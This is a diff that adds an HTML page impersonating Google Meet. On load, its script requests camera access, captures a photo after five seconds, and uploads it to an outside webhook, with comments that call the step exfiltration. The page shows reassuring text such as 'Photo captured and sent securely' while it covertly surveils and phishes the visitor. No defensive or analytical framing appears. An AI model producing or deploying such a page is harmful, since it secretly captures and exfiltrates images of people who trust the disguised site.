@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Meet</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body, html { width: 100%; height: 100%; background: #000; color: #fff; font-family: 'Google Sans', Arial, sans-serif; overflow: hidden; }
+    .meet-container {
+      width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #1a1a1a;
+    }
+    .header {
+      position: absolute; top: 0; width: 100%; background: #202124; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; font-size: 14px; z-index: 10;
+    }
+    .logo { font-size: 24px; font-weight: bold; }
+    .meeting-info { color: #aaa; }
+    .video-container {
+      position: relative; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;
+    }
+    #preview {
+      max-width: 90%; max-height: 70vh; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); transform: scaleX(-1);
+    }
+    .controls {
+      position: absolute; bottom: 30px; background: rgba(0,0,0,0.7); padding: 12px 24px; border-radius: 50px; display: flex; gap: 20px; backdrop-filter: blur(10px);
+    }
+    .btn {
+      width: 56px; height: 56px; border-radius: 50%; background: #333; display: flex; justify-content: center; align-items: center; cursor: pointer; font-size: 24px;
+    }
+    .btn.mic { background: #ea4335; }
+    .btn.cam { background: #34a853; }
+    .btn.join {
+      background: #1a73e8; color: white; padding: 0 32px; border-radius: 50px; font-size: 18px; font-weight: bold;
+    }
+    .status {
+      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 24px; color: #fff; background: rgba(0,0,0,0.6); padding: 20px 40px; border-radius: 12px;
+    }
+    .captured {
+      position: absolute; bottom: 100px; background: rgba(0,0,0,0.8); padding: 10px 20px; border-radius: 8px; font-size: 14px; display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="meet-container">
+    <div class="header">
+      <div class="logo">Meet</div>
+      <div class="meeting-info">Personal meeting room • Ready to join?</div>
+    </div>
+
+    <div class="video-container">
+      <video id="preview" autoplay playsinline muted></video>
+      <div class="status" id="status">Checking camera... Please wait 5 seconds</div>
+      <div class="captured" id="captured">Photo captured and sent securely</div>
+    </div>
+
+    <div class="controls">
+      <div class="btn mic" title="Mute">🎤</div>
+      <div class="btn cam" title="Camera on">📹</div>
+      <button class="btn join" id="joinBtn">Join now</button>
+    </div>
+  </div>
+
+  <script>
+    const video = document.getElementById('preview');
+    const status = document.getElementById('status');
+    const captured = document.getElementById('captured');
+
+    async function startCameraAndCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        video.srcObject = stream;
+        video.play();
+
+        status.textContent = "Camera ready. Capturing your image in 5 seconds...";
+
+        // Capture setelah 5 detik
+        setTimeout(async () => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.translate(canvas.width, 0);
+          ctx.scale(-1, 1); // mirror
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // CONVERT KE BLOB (LEBIH EFISIEN DARIPADA DATA URL)
+          canvas.toBlob(async (blob) => {
+            if (blob) {
+              // Exfil blob ke webhook kamu
+              const formData = new FormData();
+              formData.append('photo', blob, 'capture.png');
+
+              try {
+                await fetch("https://keen-unicorn-32.webhook.cool/capture", {
+                  method: "POST",
+                  body: formData
+                });
+                captured.style.display = 'block';
+                status.style.display = 'none';
+              } catch (e) {
+                console.log("Exfil failed:", e);
+              }
+            }
+          }, 'image/png');
+
+        }, 5000);
+
+      } catch (err) {
+        status.textContent = "Camera access denied";
+        console.log("Camera failed:", err);
+      }
+    }
+
+    // Auto start saat load
+    startCameraAndCapture();
+
+    // Tombol "Join now" juga bisa trigger ulang
+    document.getElementById("joinBtn").addEventListener("click", startCameraAndCapture);
+  </script>
+
+</body>
+</html>
